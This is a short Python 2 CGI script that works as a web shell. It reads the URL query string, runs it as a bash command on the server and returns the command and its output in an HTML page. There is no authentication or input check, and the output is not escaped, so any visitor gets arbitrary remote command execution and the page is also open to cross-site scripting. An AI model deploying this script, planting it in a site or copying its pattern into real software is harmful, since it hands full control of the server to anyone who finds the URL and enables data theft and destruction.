#!/usr/bin/python
import cgitb; cgitb.enable()

# The subprocess module is new in 2.4
import os, urllib, subprocess as sub

# Retrieve the command from the query string
# and unencode the escaped %xx chars
str_command = urllib.unquote(os.environ['QUERY_STRING'])
p = sub.Popen(['/bin/bash', '-c', str_command], 
stdout=sub.PIPE, stderr=sub.STDOUT)
output = urllib.unquote(p.stdout.read())

print "Content-Type: text/html\n"
print "str_command", str_command
print "p", p
print "output", output

print """\

<html><body>
<pre>
$ %s
%s
</pre>
</body></html>
""" % (str_command, output)
